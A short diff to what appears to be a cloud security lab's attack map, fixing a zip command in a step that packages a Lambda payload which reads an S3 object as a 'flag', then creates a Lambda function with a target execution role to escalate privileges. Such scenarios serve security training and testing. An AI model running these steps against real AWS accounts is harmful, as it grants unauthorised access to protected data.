@@ -85,7 +85,7 @@ attackMap:
                 flag = obj['Body'].read().decode('utf-8')
                 return {'statusCode': 200, 'body': json.dumps({'flag': flag})}
             EOF
-            zip /tmp/lambda_payload.zip /tmp/lambda_payload.py
+            cd /tmp && zip lambda_payload.zip lambda_payload.py && cd -
         - description: "Create the Lambda function with the target execution role"
           command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda create-function --function-name pl-lambda-006-to-bucket-escalation --runtime python3.11 --role arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-006-to-bucket-target-role --handler lambda_payload.handler --zip-file fileb:///tmp/lambda_payload.zip --timeout 30"
 
